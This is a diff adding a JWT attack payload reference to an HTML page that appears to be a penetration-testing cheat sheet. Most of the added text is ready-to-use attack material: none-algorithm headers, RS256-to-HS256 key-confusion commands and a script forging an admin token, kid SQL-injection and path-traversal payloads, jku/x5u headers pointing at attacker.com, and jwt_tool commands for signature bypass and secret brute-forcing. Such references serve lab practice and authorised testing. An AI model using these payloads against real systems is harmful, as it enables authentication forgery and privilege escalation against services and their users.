@@ -164,6 +164,104 @@ jwt_tool TOKEN -I -pc role -pv admin -S hs256 -p "cracked_secret"
 # Common privilege claims to modify:
 # role, isAdmin, admin, group, permission, scope, email, sub, user_id</code></pre>
 
+  <h2>JWT Attack Payload Reference</h2>
+  <p>Key attack payloads and techniques from PayloadsAllTheThings JWT reference.</p>
+
+  <h3>None Algorithm Variants</h3>
+  <pre><code># All none algorithm capitalization variants to try:
+{"alg":"none","typ":"JWT"}
+{"alg":"None","typ":"JWT"}
+{"alg":"NONE","typ":"JWT"}
+{"alg":"nOnE","typ":"JWT"}
+
+# Null signature attack (CVE-2020-28042) — send HS256 token without signature:
+# TOKEN format: header.payload.  (trailing dot, empty signature)
+python3 jwt_tool.py JWT_HERE -X n
+
+# Signature disclosure attack (CVE-2019-7644) — send wrong signature:
+# Some libraries respond with: "Expected CORRECT_SIG got YOUR_SIG"
+# Extract the correct signature from the error message</code></pre>
+
+  <h3>Key Confusion (RS256 to HS256)</h3>
+  <pre><code># Method 1 — obtain public key from TLS certificate:
+openssl s_client -connect target.com:443 | openssl x509 -pubkey -noout
+
+# Method 2 — obtain from JWKS endpoint:
+curl https://target/.well-known/jwks.json
+
+# Method 3 — recover public key from two signed JWTs:
+# Some tools can compute RSA public key from two signatures with same key
+# (mathematical derivation from RS256 signatures)
+
+# Sign with HS256 using public key as secret (pyjwt 0.4.3):
+pip install pyjwt==0.4.3
+python3 -c "
+import jwt
+public = open('public.pem', 'r').read()
+payload = {'sub':'admin','role':'admin','exp':9999999999}
+token = jwt.encode(payload, key=public, algorithm='HS256')
+print(token)
+"
+
+# Using jwt_tool:
+python3 jwt_tool.py JWT_HERE -X k -pk my_public.pem
+
+# Using Burp JWT Editor (PortSwigger):
+# 1. Import public key as New RSA Key
+# 2. Copy PEM, base64-encode it
+# 3. Generate New Symmetric Key, replace k value with base64-PEM
+# 4. Change alg to HS256, click Sign (Don't modify header)</code></pre>
+
+  <h3>JWT kid and jku Injection</h3>
+  <pre><code># kid SQL injection:
+{"alg":"HS256","typ":"JWT","kid":"' UNION SELECT 'pwned'-- "}
+# Sign token with key = 'pwned'
+python3 jwt_tool.py JWT_HERE -I -hc kid -hv "' UNION SELECT 'pwned'-- " -S hs256 -p "pwned"
+
+# kid path traversal (sign with /dev/null = empty string):
+{"alg":"HS256","typ":"JWT","kid":"../../../../dev/null"}
+# Sign with empty string as key
+python3 jwt_tool.py JWT_HERE -I -hc kid -hv "../../../../dev/null" -S hs256 -p ""
+
+# jku header injection — host your own JWKS:
+{"alg":"RS256","jku":"https://attacker.com/jwks.json","kid":"attacker-key"}
+# Generate RSA key pair, host JWKS with your public key, sign with private key
+
+# x5u header injection (X.509 cert URL):
+{"alg":"RS256","x5u":"https://attacker.com/cert.pem","kid":"attacker"}
+
+# Embedded JWK attack (CVE-2018-0114):
+python3 jwt_tool.py JWT_HERE -X i    # auto-generates embedded JWK</code></pre>
+
+  <h2>JWT Algorithm Confusion Payloads</h2>
+  <p>Algorithm table and confusion attack summary for quick reference.</p>
+
+  <pre><code># JWT algorithm identifiers (alg header values):
+# HS256/384/512 — HMAC (symmetric) — same key signs and verifies
+# RS256/384/512 — RSA  (asymmetric) — private key signs, public key verifies
+# ES256/384/512 — ECDSA (asymmetric)
+# PS256/384/512 — RSA-PSS
+# none          — no signature (dangerous if accepted)
+
+# Algorithm confusion attack matrix:
+# Server configured for → Attack as →
+# RS256                 → HS256 (use RSA public key as HMAC secret)
+# RS384                 → HS384
+# ES256                 → HS256 (use EC public key)
+
+# Check for confusion: get a valid RS256 token, modify alg to HS256,
+# sign with the public key as HMAC secret, submit
+
+# jwt_tool cheatsheet:
+jwt_tool TOKEN                          # decode and analyze
+jwt_tool TOKEN -X a                     # none algorithm attack
+jwt_tool TOKEN -X n                     # null signature attack
+jwt_tool TOKEN -X k -pk public_key.pem  # key confusion (RS256→HS256)
+jwt_tool TOKEN -X i                     # embedded JWK attack
+jwt_tool TOKEN -X s                     # algorithm confusion
+jwt_tool TOKEN -I -pc role -pv admin -S hs256 -p "secret"  # inject + sign
+jwt_tool TOKEN --crack -d rockyou.txt   # brute force HMAC secret</code></pre>
+
   <h2>JWT Labs &amp; Tools</h2>
   <ul>
     <li>PortSwigger JWT labs — <code>portswigger.net/web-security/jwt</code></li>
